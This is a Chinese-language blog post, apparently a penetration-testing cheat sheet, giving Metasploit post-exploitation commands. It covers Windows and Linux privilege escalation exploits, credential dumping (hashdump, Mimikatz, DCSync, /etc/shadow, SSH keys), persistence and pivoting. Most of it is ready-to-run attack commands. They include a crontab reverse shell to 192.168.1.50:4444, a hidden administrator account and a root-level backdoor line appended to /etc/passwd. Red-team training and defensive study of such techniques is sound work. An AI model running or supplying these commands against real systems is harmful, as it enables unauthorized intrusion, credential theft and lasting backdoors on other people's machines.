---
title: MSF提权与权限维持
date: 2026-07-23 13:00:00 +0800
categories: [工具速查, MSF利用]
tags: [Metasploit, 提权, 权限维持, 后渗透]
description: MSF 后渗透实战，涵盖本地提权漏洞利用、凭证窃取、持久化后门、隧道通信等核心技术。
---

# MSF提权与权限维持

## 一、后渗透概述

在获取初始访问权限后，核心任务是：

1. **权限提升**：从普通用户提升到 SYSTEM/root
2. **信息收集**：收集内网信息为横向移动做准备
3. **权限维持**：确保访问权限持久有效
4. **数据获取**：获取目标数据

## 二、Meterpreter 基础命令

### 系统信息收集

```bash
# 系统信息
meterpreter > sysinfo

# 当前身份
meterpreter > getuid

# 进程列表
meterpreter > ps

# 查看当前权限
meterpreter > getsystem -h

# 查看网络配置
meterpreter > ipconfig

# 路由信息
meterpreter > route

# 查看用户列表
meterpreter > shell
C:\> whoami /all
```

### 文件操作

```bash
# 上传文件
meterpreter > upload /root/payload.exe C:\\Windows\\Temp\\

# 下载文件
meterpreter > download C:\\Windows\\System32\\sam /tmp/sam

# 执行命令
meterpreter > execute -f cmd.exe -i

# 交互式 Shell
meterpreter > shell
```

## 三、权限提升

### Windows 提权

#### getsystem（内置提权）

```bash
meterpreter > getsystem -t 0  # 技术0：Named Pipe Impersonation
meterpreter > getsystem -t 1  # 技术1：Token Duplication
meterpreter > getsystem -t 2  # 技术2：Named Pipe Impersonation (内存)
meterpreter > getsystem -t 3  # 技术3：Named Pipe Impersonation (修改线程令牌)
```

#### MS16-032 提权

```bash
meterpreter > background
msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set SESSION 1
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST 192.168.1.50
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
```

#### CVE-2018-8120 (Win32k)

```bash
msf6 > use exploit/windows/local/bypassuac_sluihijack
```

#### 其他提权模块

```bash
# UAC 绕过
msf6 > use exploit/windows/local/bypassuac
msf6 > use exploit/windows/local/bypassuac_injection
msf6 > use exploit/windows/local/bypassuac_sdclt

# Potato 系列
msf6 > use exploit/windows/local/ms16_135_reflected_dcomlpevel
```

### Linux 提权

#### SUID 提权辅助

```bash
meterpreter > background
msf6 > use post/linux/gather/enum_configs
msf6 > use post/linux/gather/enum_protection
msf6 > use post/linux/gather/checkvm
```

#### CVE-2021-4034 (PwnKit)

```bash
msf6 > use exploit/linux/local/cve_2021_4034_pwnkit_lpe
```

#### CVE-2021-3156 (Baron Samedit)

```bash
msf6 > use exploit/linux/local/baron_samedit
```

## 四、凭证获取

### Windows 凭证

#### Hashdump

```bash
meterpreter > hashdump
# 输出：Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

#### Mimikatz 集成

```bash
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
meterpreter > wifi_list
```

#### DCSync（域控）

```bash
meterpreter > dcsync_ntlm krbtgt
```

### Linux 凭证

```bash
# 获取 /etc/shadow
meterpreter > cat /etc/shadow

# SSH 密钥
meterpreter > cat ~/.ssh/id_rsa

# 历史命令
meterpreter > cat ~/.bash_history
```

## 五、权限维持

### Windows 持久化

#### 注册表自启动

```bash
meterpreter > run persistence -X -i 30 -p 4444 -r 192.168.1.50
# -X: 开机自启
# -i: 回连间隔（秒）
# -p: 监听端口
# -r: 回调地址
```

#### 计划任务

```bash
meterpreter > run scheduleme -c "C:\\Windows\\Temp\\payload.exe" -i 60
```

#### 创建隐藏用户

```bash
meterpreter > shell
C:\> net user hacker P@ssw0rd /add
C:\> net localgroup administrators hacker /add
```

#### WMI 事件订阅

```bash
meterpreter > run metsvc -A
# 自动安装 Meterpreter 服务
```

### Linux 持久化

#### SSH 公钥

```bash
meterpreter > shell
$ echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
$ chmod 600 ~/.ssh/authorized_keys
```

#### Crontab

```bash
$ (crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -i >& /dev/tcp/192.168.1.50/4444 0>&1") | crontab -
```

#### 后门账户

```bash
$ echo "toor:$(openssl passwd -1 -salt xyz password):0:0:root:/root:/bin/bash" >> /etc/passwd
```

## 六、隧道与通信

### Portfwd 端口转发

```bash
# 将目标内网 3389 转发到本地 13389
meterpreter > portfwd add -l 13389 -p 3389 -r 192.168.1.100

# 查看转发列表
meterpreter > portfwd list

# 删除转发
meterpreter > portfwd delete -l 13389
```

### Route 路由

```bash
# 添加内网路由
meterpreter > run autoroute -s 10.10.10.0/24

# 查看路由
meterpreter > run autoroute -p

# 删除路由
meterpreter > run autoroute -d -s 10.10.10.0/24
```

### SOCKS 代理

```bash
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j

# 然后可以使用 proxychains 访问内网
# proxychains nmap -sT -Pn 10.10.10.0/24
```

---

> 下一篇文章将介绍如何利用已控主机进行内网横向移动，包括 Pass-the-Hash、SMB 中继、WMI 远程执行等技术。
